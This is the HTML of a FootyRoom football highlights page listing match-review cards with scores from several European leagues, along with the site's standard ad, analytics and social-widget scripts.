					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/united-ready-to-spend-200m-on-dybala-101039">
			<img src="http://images.footyroom.com/thumbs/9af2a6d2e47a2f22a7ffd5971d153785/sydney-fc-kashima-antlers" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>2700</div>
													<div class="comments-count"><span class="icon"></span>4</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/united-ready-to-spend-200m-on-dybala-101039" target="_blank" class="spoiler">United Ready To Spend &pound;200M On Dybala</a>
		<a href="http://footyroom.com/lemix/united-ready-to-spend-200m-on-dybala-101039" target="_blank" class="not-spoiler">United Ready To Spend &pound;200M On Dybala</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">13 days ago</span>
</div>
		
		<div class="card card--lemix">
			<div class="card--view-all">
				<a class="card-view-all" href="/lemix" target="_blank">View all <span class="icn-arrow-right"></span></a>
			</div>
		</div>
	</div>
</div>
	<top-matches class="full-width"></top-matches>

	<div id="infinite-scroll" class="full-width" fr-fixed-header fr-infinite-scroll>
		<script type="text/javascript">
			DataStore['postsEndpointUrl'] = '/posts-pagelet';
		</script>

		
		<div class="posts-page clearfix first-page">
			<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944242/real-madrid-vs-girona/review">
			<img src="http://images.footyroom.com/thumbs/869883fab946aa162ce6d04b3f7d771a/real-madrid-girona" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>73500</div>
													<div class="comments-count"><span class="icon"></span>72</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944242/real-madrid-vs-girona/review" target="_blank" class="spoiler">Real Madrid 6 - 3 Girona</a>
		<a href="http://footyroom.com/matches/79944242/real-madrid-vs-girona/review" target="_blank" class="not-spoiler">Real Madrid vs Girona</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/19/la-liga">La Liga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944246/barcelona-vs-athletic-bilbao/review">
			<img src="http://images.footyroom.com/thumbs/9d598fde3c76e80d8bbdda499dae1a40/barcelona-athletic-bilbao" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>42300</div>
													<div class="comments-count"><span class="icon"></span>45</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944246/barcelona-vs-athletic-bilbao/review" target="_blank" class="spoiler">Barcelona 2 - 0 Athletic Bilbao</a>
		<a href="http://footyroom.com/matches/79944246/barcelona-vs-athletic-bilbao/review" target="_blank" class="not-spoiler">Barcelona vs Athletic Bilbao</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/19/la-liga">La Liga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79950215/leicester-city-vs-chelsea/review">
			<img src="http://images.footyroom.com/thumbs/ab485712716a6799a8ba84e70c83d207/leicester-city-chelsea" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>43800</div>
													<div class="comments-count"><span class="icon"></span>22</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79950215/leicester-city-vs-chelsea/review" target="_blank" class="spoiler">Leicester City 1 - 2 Chelsea</a>
		<a href="http://footyroom.com/matches/79950215/leicester-city-vs-chelsea/review" target="_blank" class="not-spoiler">Leicester City vs Chelsea</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/22/fa-cup">FA Cup</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79950216/wigan-athletic-vs-southampton/review">
			<img src="http://images.footyroom.com/thumbs/5f8d7aa6b29763e4776e355cc8467359/wigan-athletic-southampton" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>7050</div>
													<div class="comments-count"><span class="icon"></span>2</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79950216/wigan-athletic-vs-southampton/review" target="_blank" class="spoiler">Wigan Athletic 0 - 2 Southampton</a>
		<a href="http://footyroom.com/matches/79950216/wigan-athletic-vs-southampton/review" target="_blank" class="not-spoiler">Wigan Athletic vs Southampton</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/22/fa-cup">FA Cup</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944924/sampdoria-vs-inter/review">
			<img src="http://images.footyroom.com/thumbs/c8f635d3edc9ae81edb7b8184e02dd42/sampdoria-inter" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>24600</div>
													<div class="comments-count"><span class="icon"></span>8</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944924/sampdoria-vs-inter/review" target="_blank" class="spoiler">Sampdoria 0 - 5 Inter</a>
		<a href="http://footyroom.com/matches/79944924/sampdoria-vs-inter/review" target="_blank" class="not-spoiler">Sampdoria vs Inter</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944921/ac-milan-vs-chievoverona/review">
			<img src="http://images.footyroom.com/thumbs/752ed28971f46935b8e2b6bf5319d5ef/ac-milan-chievoverona" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>21600</div>
													<div class="comments-count"><span class="icon"></span>11</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944921/ac-milan-vs-chievoverona/review" target="_blank" class="spoiler">AC Milan 3 - 2 ChievoVerona</a>
		<a href="http://footyroom.com/matches/79944921/ac-milan-vs-chievoverona/review" target="_blank" class="not-spoiler">AC Milan vs ChievoVerona</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944926/crotone-vs-roma/review">
			<img src="http://images.footyroom.com/thumbs/9bf26230f82f3213335de1d2a2640038/crotone-roma" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>6900</div>
													<div class="comments-count"><span class="icon"></span>2</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944926/crotone-vs-roma/review" target="_blank" class="spoiler">Crotone 0 - 2 Roma</a>
		<a href="http://footyroom.com/matches/79944926/crotone-vs-roma/review" target="_blank" class="not-spoiler">Crotone vs Roma</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944923/ssc-napoli-vs-genoa/review">
			<img src="http://images.footyroom.com/thumbs/27f7608af9236c0cc83447d5a2b67f19/ssc-napoli-genoa" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>3900</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944923/ssc-napoli-vs-genoa/review" target="_blank" class="spoiler">SSC Napoli 1 - 0 Genoa</a>
		<a href="http://footyroom.com/matches/79944923/ssc-napoli-vs-genoa/review" target="_blank" class="not-spoiler">SSC Napoli vs Genoa</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944919/lazio-vs-bologna/review">
			<img src="http://images.footyroom.com/thumbs/6a751083f248be060bdbf5e4e35b2ef7/lazio-bologna" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>1950</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944919/lazio-vs-bologna/review" target="_blank" class="spoiler">Lazio 1 - 1 Bologna</a>
		<a href="http://footyroom.com/matches/79944919/lazio-vs-bologna/review" target="_blank" class="not-spoiler">Lazio vs Bologna</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944922/torino-vs-fiorentina/review">
			<img src="http://images.footyroom.com/thumbs/d153a63b78454b8a00e97a58c0ff826d/torino-fiorentina" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>1950</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944922/torino-vs-fiorentina/review" target="_blank" class="spoiler">Torino 1 - 2 Fiorentina</a>
		<a href="http://footyroom.com/matches/79944922/torino-vs-fiorentina/review" target="_blank" class="not-spoiler">Torino vs Fiorentina</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79941307/nice-vs-paris-saint-germain/review">
			<img src="http://images.footyroom.com/thumbs/db0259cb7f3f62d11a23b94e8bab1cae/nice-paris-saint-germain" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>28650</div>
													<div class="comments-count"><span class="icon"></span>8</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79941307/nice-vs-paris-saint-germain/review" target="_blank" class="spoiler">Nice 1 - 2 Paris Saint Germain</a>
		<a href="http://footyroom.com/matches/79941307/nice-vs-paris-saint-germain/review" target="_blank" class="not-spoiler">Nice vs Paris Saint Germain</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/7/ligue-1">Ligue 1</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79942469/rasenballsport-leipzig-vs-bayern-munich/review">
			<img src="http://images.footyroom.com/thumbs/809b9628e420dc832c558883d41738c6/rasenballsport-leipzig-bayern-munich" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>19650</div>
													<div class="comments-count"><span class="icon"></span>12</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79942469/rasenballsport-leipzig-vs-bayern-munich/review" target="_blank" class="spoiler">RasenBallsport Leipzig 2 - 1 Bayern Munich</a>
		<a href="http://footyroom.com/matches/79942469/rasenballsport-leipzig-vs-bayern-munich/review" target="_blank" class="not-spoiler">RasenBallsport Leipzig vs Bayern Munich</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/8/bundesliga">Bundesliga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="clear">&nbsp;</div>
			<div class="wide_sponsors">
				<div class="FR_WideBoard_Middle">
											<div id='div-gpt-ad-1341915070098-3'>
							<script type='text/javascript'>
								freestar.queue.push(function() {
									var slot = googletag.defineSlot('/1873845/FR_WideBoard_Middle', [[728, 90], [970, 250], [300, 250]], 'div-gpt-ad-1341915070098-3')
										.defineSizeMapping(googletag.sizeMapping()
											.addSize([1024, 0], [[970, 250],[728, 90]])
											.addSize([800, 0], [728, 90])
											.addSize([0, 0], [300, 250])
											.build()
										)
										.addService(googletag.pubads());

									googletag.display('div-gpt-ad-1341915070098-3');

									if (pbjs.initAdserverSet) {
										googletag.pubads().refresh([slot]);
									}
								});
							</script>
						</div>
									</div>
			</div>
					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79942468/borussia-dortmund-vs-hannover-96/review">
			<img src="http://images.footyroom.com/thumbs/4a27a3aa8038e9e9e91b8b7653ace555/borussia-dortmund-hannover-96" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>12150</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79942468/borussia-dortmund-vs-hannover-96/review" target="_blank" class="spoiler">Borussia Dortmund 1 - 0 Hannover 96</a>
		<a href="http://footyroom.com/matches/79942468/borussia-dortmund-vs-hannover-96/review" target="_blank" class="not-spoiler">Borussia Dortmund vs Hannover 96</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/8/bundesliga">Bundesliga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79942470/fc-cologne-vs-bayer-leverkusen/review">
			<img src="http://images.footyroom.com/thumbs/0eab9fbf2e4080073376232d34d059d2/fc-cologne-bayer-leverkusen" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>2400</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79942470/fc-cologne-vs-bayer-leverkusen/review" target="_blank" class="spoiler">FC Cologne 2 - 0 Bayer Leverkusen</a>
		<a href="http://footyroom.com/matches/79942470/fc-cologne-vs-bayer-leverkusen/review" target="_blank" class="not-spoiler">FC Cologne vs Bayer Leverkusen</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/8/bundesliga">Bundesliga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944244/villarreal-vs-atletico-madrid/review">
			<img src="http://images.footyroom.com/thumbs/f19429f0801306b3c56b4a15cfb66516/villarreal-atletico-madrid" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>9600</div>
													<div class="comments-count"><span class="icon"></span>11</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944244/villarreal-vs-atletico-madrid/review" target="_blank" class="spoiler">Villarreal 2 - 1 Atletico Madrid</a>
		<a href="http://footyroom.com/matches/79944244/villarreal-vs-atletico-madrid/review" target="_blank" class="not-spoiler">Villarreal vs Atletico Madrid</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/19/la-liga">La Liga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944247/leganes-vs-sevilla/review">
			<img src="http://images.footyroom.com/thumbs/eea17f2bd35fa408b006c403712fe444/leganes-sevilla" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>1800</div>
													<div class="comments-count"><span class="icon"></span>6</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944247/leganes-vs-sevilla/review" target="_blank" class="spoiler">Leganes 2 - 1 Sevilla</a>
		<a href="http://footyroom.com/matches/79944247/leganes-vs-sevilla/review" target="_blank" class="not-spoiler">Leganes vs Sevilla</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/19/la-liga">La Liga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944245/celta-vigo-vs-malaga/review">
			<img src="http://images.footyroom.com/thumbs/e03040f25bb35f8bf5fd3ffd9fdad021/celta-vigo-malaga" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>150</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944245/celta-vigo-vs-malaga/review" target="_blank" class="spoiler">Celta Vigo 0 - 0 Malaga</a>
		<a href="http://footyroom.com/matches/79944245/celta-vigo-vs-malaga/review" target="_blank" class="not-spoiler">Celta Vigo vs Malaga</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/19/la-liga">La Liga</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944918/hellas-verona-vs-atalanta/review">
			<img src="http://images.footyroom.com/thumbs/1eb65992844c3d7cc76f658be85aea0d/hellas-verona-atalanta" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>1350</div>
													<div class="comments-count"><span class="icon"></span>2</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944918/hellas-verona-vs-atalanta/review" target="_blank" class="spoiler">Hellas Verona 0 - 5 Atalanta</a>
		<a href="http://footyroom.com/matches/79944918/hellas-verona-vs-atalanta/review" target="_blank" class="not-spoiler">Hellas Verona vs Atalanta</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79944920/benevento-vs-cagliari/review">
			<img src="http://images.footyroom.com/thumbs/96af0cc80ea3e83859b8997059c8c8f5/benevento-cagliari" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>600</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79944920/benevento-vs-cagliari/review" target="_blank" class="spoiler">Benevento 1 - 2 Cagliari</a>
		<a href="http://footyroom.com/matches/79944920/benevento-vs-cagliari/review" target="_blank" class="not-spoiler">Benevento vs Cagliari</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/9/serie-a">Serie A</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79943451/istanbul-basaksehir-vs-besiktas/review">
			<img src="http://images.footyroom.com/thumbs/effc7d2e86615f8800817e4bb14c53d6/istanbul-basaksehir-besiktas" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>1350</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79943451/istanbul-basaksehir-vs-besiktas/review" target="_blank" class="spoiler">Istanbul Basaksehir 1 - 0 Besiktas</a>
		<a href="http://footyroom.com/matches/79943451/istanbul-basaksehir-vs-besiktas/review" target="_blank" class="not-spoiler">Istanbul Basaksehir vs Besiktas</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/14/sueper-lig">S&uuml;per Lig</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79943450/trabzonspor-vs-yeni-malatyaspor/review">
			<img src="http://images.footyroom.com/thumbs/d5105167da08553f97f42637271c41d9/trabzonspor-yeni-malatyaspor" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>450</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79943450/trabzonspor-vs-yeni-malatyaspor/review" target="_blank" class="spoiler">Trabzonspor 4 - 1 Yeni Malatyaspor</a>
		<a href="http://footyroom.com/matches/79943450/trabzonspor-vs-yeni-malatyaspor/review" target="_blank" class="not-spoiler">Trabzonspor vs Yeni Malatyaspor</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/14/sueper-lig">S&uuml;per Lig</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79941303/marseille-vs-lyon/review">
			<img src="http://images.footyroom.com/thumbs/eac30133182beae048d468a40f2b7121/marseille-lyon" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>8850</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79941303/marseille-vs-lyon/review" target="_blank" class="spoiler">Marseille 2 - 3 Lyon</a>
		<a href="http://footyroom.com/matches/79941303/marseille-vs-lyon/review" target="_blank" class="not-spoiler">Marseille vs Lyon</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/7/ligue-1">Ligue 1</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79940408/sparta-rotterdam-vs-ajax/review">
			<img src="http://images.footyroom.com/thumbs/ed95b531672d39cfc91d1cce6650b822/sparta-rotterdam-ajax" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>2850</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79940408/sparta-rotterdam-vs-ajax/review" target="_blank" class="spoiler">Sparta Rotterdam 2 - 5 Ajax</a>
		<a href="http://footyroom.com/matches/79940408/sparta-rotterdam-vs-ajax/review" target="_blank" class="not-spoiler">Sparta Rotterdam vs Ajax</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/10/eredivisie">Eredivisie</a>
		
		<span class="card-time">2 days ago</span>
</div>

					<div class="card col-xs-12 col-ms-6 col-md-4  ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/79940410/pec-zwolle-vs-feyenoord/review">
			<img src="http://images.footyroom.com/thumbs/cb6f849fde713e51780622287e97594d/pec-zwolle-feyenoord" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>1350</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/79940410/pec-zwolle-vs-feyenoord/review" target="_blank" class="spoiler">PEC Zwolle 3 - 4 Feyenoord</a>
		<a href="http://footyroom.com/matches/79940410/pec-zwolle-vs-feyenoord/review" target="_blank" class="not-spoiler">PEC Zwolle vs Feyenoord</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/competitions/10/eredivisie">Eredivisie</a>
		
		<span class="card-time">2 days ago</span>
</div>

			
	</div>
			</div>

	<div class="info-box text-center" ng-if="postsLoading && !loadMoreEnabled" ng-cloak>Loading <span class="spinner"></span></div>

	<div class="clearfix">
		<div class="btn btn-default col-xs-12" fr-ladda="postsLoading" ng-click="enableInfiniteScroll()" ng-if="loadMoreEnabled">Load more</div>
	</div>

                            <div class="footer-content full-width">
                    <div class="clearfix">
                        <div class="col-md-3 visible-md visible-lg">
                            <div class="footer-logo"></div>
                        </div>
                        
                        <div class="col-md-5 col-sm-6 filter filter--footer">
                            <a class="filter__item" href="http://footyroom.com/DMCA">DMCA</a>
                            <a class="filter__item" href="/privacy-policy.html">Privacy Policy</a>
                            <a class="filter__item" href="http://footyroom.com/feedback">Feedback</a>
                            <a class="filter__item" href="http://footyroom.com/advertise">Advertise</a>
                        </div>
                        
                        <div class="footer-icons col-md-4 col-sm-6">
                            <a href="https://itunes.apple.com/us/app/footyroom-app/id807484450?mt=8" target="_blank">
                                <img src="/pics/newsletter/apple-store.png" width="124px">
                            </a>
                            <a href="https://www.facebook.com/FootyRoom" target="_blank" class="social-icon facebook"></a>
                            <a href="https://twitter.com/footyroom" target="_blank" class="social-icon twitter"></a>
                            <a href="http://instagram.com/footyroom" target="_blank" class="social-icon instagram"></a>
                            <a href="https://vk.com/footyroom" target="_blank" class="social-icon vk"></a>
                        </div>
                    </div>
                    <div class="copyleft">© FootyRoom 2009 - 2018</div>
                </div>
                    </div>

        <script>
          (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
          })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

            // Creates an adblock detection plugin.
          ga('provide', 'adblockTracker', function(tracker, opts) {
            var ad = document.createElement('ins');
            ad.className = 'AdSense';
            ad.style.display = 'block';
            ad.style.position = 'absolute';
            ad.style.top = '-1px';
            ad.style.height = '1px';
            document.body.appendChild(ad);
            tracker.set('dimension' + opts.dimensionIndex, !ad.clientHeight);
            document.body.removeChild(ad);
          });

          ga('create', 'UA-4779751-2', 'auto');
          ga('require', 'adblockTracker', {dimensionIndex: 1});
          ga('send', 'pageview');

        </script>

        <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
        <script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>

        <script>
            var HW_config = {
                selector: ".headway",
                account: "7QjZLJ"
            };
        </script>
        <script async src="//cdn.headwayapp.co/widget.js"></script>

        <!-- Composite Start -->
        <div id="M22428ScriptRootC187013">
            <script>
                (function () {
                    var D = new Date(), d = document, b = 'body', ce = 'createElement', ac = 'appendChild', st = 'style', ds = 'display', n = 'none', gi = 'getElementById';
                    var i = d[ce]('iframe'); i[st][ds] = n; d[gi]("M22428ScriptRootC187013")[ac](i); try { var iw = i.contentWindow.document; iw.open(); iw.writeln("<ht" + "ml><bo" + "dy></bo" + "dy></ht" + "ml>"); iw.close(); var c = iw[b]; }
                    catch (e) { var iw = d; var c = d[gi]("M22428ScriptRootC187013"); } var dv = iw[ce]('div'); dv.id = "MG_ID"; dv[st][ds] = n; dv.innerHTML = 187013; c[ac](dv);
                    var s = iw[ce]('script'); s.async = 'async'; s.defer = 'defer'; s.charset = 'utf-8'; s.src = "//jsc.mgid.com/f/o/footyroom.com.187013.js?t=" + D.getYear() + D.getMonth() + D.getDate() + D.getHours(); c[ac](s);
                })();
            </script>
        </div>
        <!-- Composite End -->

            <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"81ee9c0b70","applicationID":"21116691","transactionName":"YFNTbRMHXBcFBkVYDlkZckwSEl0JSw1eXAQ=","queueTime":0,"applicationTime":46,"atts":"TBRQG1sdTxk=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
</html>